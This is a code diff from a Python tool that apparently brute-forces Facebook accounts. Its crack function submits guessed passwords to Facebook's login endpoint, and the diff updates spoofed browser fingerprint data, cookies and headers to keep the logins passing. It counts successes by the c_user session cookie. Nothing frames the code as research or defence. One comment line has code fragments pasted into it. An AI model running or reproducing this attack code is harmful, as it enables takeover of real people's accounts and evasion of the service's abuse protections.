@@ -145,7 +145,7 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
             sys.stdout.flush()
             
-            # Create session and generate device hash
+            # Create session and generate device hash  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),   re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
             Session = requests.Session()
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
@@ -172,35 +172,44 @@ def crack(uid, password_list, total_count):
             requu1 = Session.get(url1,headers=head)
             log_data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), 
+            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'email': uid,
             'login_source': 'comet_headerless_login',
             'next': '',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc3MDQzNjM5MC41NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc3MDQzNjM5MC41NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzcwNDM2MzkwLjU3NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoyfV0sIjMwMDAzIjpbeyJ0IjoxNzcwNDM2MzkwLjU3NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjpbImVuLVVTIiwiZW4iXX1dLCIzMDAwNCI6W3sidCI6MTc3MDQzNjM5MC41NzcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwiZSI6eyJlYyI6M319XSwiMzAwMDUiOlt7InQiOjE3NzA0MzYzOTAuNTc3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6MTQ0MCwiaCI6Nzc1fX1dLCIzMDAwNyI6W3sidCI6MTc3MDQzNjM5MC41NzgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzcwNDM2MzkwLjY2MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc3MDQzNjM5MC41NzksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IiJ9XSwiMzAwMTMiOlt7InQiOjE3NzA0MzYzOTAuNTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6IjUuMCAoV2luZG93cykifV0sIjMwMDE1IjpbeyJ0IjoxNzcwNDM2MzkwLjU4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NzA0MzYzOTAuNTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc3MDQzNjM5MC41OTQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc3MDQzNjM5MC41OTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc3MDQzNjM5MC41OTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc3MDQzNjM5MC41OTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjE0Ny4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0Ny4wIn1dLCIzMDA5NSI6W3sidCI6MTc3MDQzNjM5MC41OTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Mn1dLCIzMDEwNiI6W3sidCI6MTc3MDQzNjM5MC41MTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9LHsidCI6MTc3MDQzNjM5MS44NDEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc3MDQzNjM5MC41MTUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XX0=',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc3MTQ4ODI4MC42NTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NzE0ODgyODAuNjU3LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOlsiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzcxNDg4MjgwLjY1OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3NzE0ODgyODAuNjU4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnsidyI6MTQ0MCwiaCI6ODI2fX1dLCIzMDAwNyI6W3sidCI6MTc3MTQ4ODI4MC42NTgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6ImdyYW50ZWQifV0sIjMwMDA4IjpbeyJ0IjoxNzcxNDg4MjgwLjY4MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiZ3JhbnRlZCJ9XSwiMzAwMTIiOlt7InQiOjE3NzE0ODgyODAuNjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc3MTQ4ODI4MC42NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDUuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTQ1LjAuMC4wIn1dLCIzMDAxNSI6W3sidCI6MTc3MTQ4ODI4MC42NiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzcxNDg4MjgwLjY2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjJ9XSwiMzAwMjIiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3NzE0ODgyODAuNjc0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQ1LjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzE0NS4wLjAuMCJ9XSwiMzAwOTUiOlt7InQiOjE3NzE0ODgyODAuNjc1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOjF9XSwiMzAxMDYiOlt7InQiOjE3NzE0ODgyODAuNjUzLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfSx7InQiOjE3NzE0ODgyODIuNDU2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NzE0ODgyODAuNjU0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vIn0sInYiOmZhbHNlfV19',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'uXVJaaFEa9Qrnv5Qmf5KJkuA',
+            'datr': 'bfiWaQ-ztUMDinNiitDAT4Xz',
+            'fr': '0Aa5YrUSGNwX2vFe5..Bplvht..AAA.0.0.Bplvht.AWc6c0JZ3znzY7cWMVMewr_1vwM',
+            'sb': 'bfiWaSzLcrsML9YT6cT_wkuS',
             'ps_l': '1',
             'ps_n': '1',
-            'fr': '01xppZULU8R2nXIyZ..Bph1CC..AAA.0.0.Bph1CC.AWeNDzALoWu-a4JCAQB_ZtUJexc',
-            'sb': 'glCHafRBpRB-c5zzVl0HZyzI',
-            'wd': '1440x610',}
+            'wd': '1034x796',}
             headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Referer': 'https://www.facebook.com/?__mmr=1&_rdr',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
-            'Alt-Used': 'www.facebook.com',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',}
-            respon = Session.post('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzcwNDc1NjUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',cookies=cookies,headers=headers,data=data)
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'pragma': 'no-cache',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Microsoft Edge";v="145", "Chromium";v="145"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Microsoft Edge";v="145.0.3800.65", "Chromium";v="145.0.7632.76"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
+            'viewport-width': '1034',}
+            respon = Session.post('https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzcxNTAxNjc3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',cookies=cookies,headers=headers,data=data)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
